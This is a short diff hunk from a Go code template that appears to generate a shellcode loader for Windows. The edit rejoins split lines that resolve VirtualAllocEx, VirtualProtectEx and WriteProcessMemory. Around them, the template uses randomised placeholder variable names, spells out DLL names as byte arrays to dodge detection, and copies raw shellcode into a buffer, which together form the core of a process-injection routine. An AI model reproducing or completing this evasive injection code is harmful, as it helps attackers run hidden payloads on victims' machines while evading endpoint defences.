@@ -1315,12 +1315,9 @@ func {{.Variables.FunctionName}}({{.Variables.raw_bin}} []byte) {
 	{{.Variables.shellcode}}  := {{.Variables.raw_bin}}
 	{{.Variables.kernel32}} := windows.NewLazySystemDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',}))
 	{{.Variables.ntdll}} := windows.NewLazySystemDLL(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}))
-	{{.Variables.VirtualAllocEx}} := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc
-	("VirtualAllocEx")
-	{{.Variables.VirtualProtectEx}} := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc
-	("VirtualProtectEx")
-	{{.Variables.WriteProcessMemory}} := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc
-	("WriteProcessMemory")
+	{{.Variables.VirtualAllocEx}} := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc("VirtualAllocEx")
+	{{.Variables.VirtualProtectEx}} := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc("VirtualProtectEx")
+	{{.Variables.WriteProcessMemory}} := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc("WriteProcessMemory")
 	{{.Variables.NtQueryInformationProcess}} := {{.Variables.ntdll}}.NewProc("NtQueryInformationProcess")
 
 	var {{.Variables.stdInRead}} windows.Handle
